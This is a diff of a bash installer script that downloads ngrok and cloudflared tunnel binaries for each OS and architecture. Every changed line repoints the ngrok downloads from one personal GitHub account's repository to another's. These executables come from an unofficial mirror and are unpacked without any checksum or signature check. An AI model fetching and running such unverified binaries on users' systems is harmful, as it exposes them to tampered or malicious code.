@@ -357,14 +357,14 @@ if ! [[ -f $HOME/.ngrokfolder/ngrok && -f $HOME/.cffolder/cloudflared ]] ; then
         cd "$cwd"
         if echo "$platform" | grep -q "Darwin"; then
             if echo "$arch" | grep -q "x86_64"; then
-                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-darwin-amd64.zip" -O "ngrok.zip"
+                wget -q --show-progress "https://github.com/XPH4N70M/files/raw/main/ngrok/ngrok-stable-darwin-amd64.zip" -O "ngrok.zip"
                 ngrokdel
                 wget -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz" -O "cloudflared.tgz"
                 tar -zxf cloudflared.tgz > /dev/null 2>&1
                 rm -rf cloudflared.tgz
                 break
             elif echo "$arch" | grep -q "arm64"; then
-                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-arm64.zip" -O "ngrok.zip"
+                wget -q --show-progress "https://github.com/XPH4N70M/files/raw/main/ngrok/ngrok-stable-arm64.zip" -O "ngrok.zip"
                 ngrokdel
                 echo -e "${error}Cloudflared not available for device architecture!"
                 sleep 3
@@ -379,23 +379,23 @@ if ! [[ -f $HOME/.ngrokfolder/ngrok && -f $HOME/.cffolder/cloudflared ]] ; then
                 if [ -e ngrok-stable-linux-arm64.tgz ];then
                    rm -rf ngrok-stable-linux-arm64.tgz
                 fi
-                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm64.tgz" -O "ngrok.tgz"
+                wget -q --show-progress "https://github.com/XPH4N70M/files/raw/main/ngrok/ngrok-stable-linux-arm64.tgz" -O "ngrok.tgz"
                 tar -zxf ngrok.tgz
                 rm -rf ngrok.tgz
                 wget -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" -O "cloudflared"
                 break
             elif echo "$arch" | grep -q "arm"; then
-                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm.zip" -O "ngrok.zip"
+                wget -q --show-progress "https://github.com/XPH4N70M/files/raw/main/ngrok/ngrok-stable-linux-arm.zip" -O "ngrok.zip"
                 ngrokdel
                 wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' -O "cloudflared"
                 break
             elif echo "$arch" | grep -q "x86_64"; then
-                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-amd64.zip" -O "ngrok.zip"
+                wget -q --show-progress "https://github.com/XPH4N70M/files/raw/main/ngrok/ngrok-stable-linux-amd64.zip" -O "ngrok.zip"
                 ngrokdel
                 wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' -O "cloudflared"
                 break
             else
-                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-386.zip" -O "ngrok.zip"
+                wget -q --show-progress "https://github.com/XPH4N70M/files/raw/main/ngrok/ngrok-stable-linux-386.zip" -O "ngrok.zip"
                 ngrokdel
                 wget -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386" -O "cloudflared"
                 break
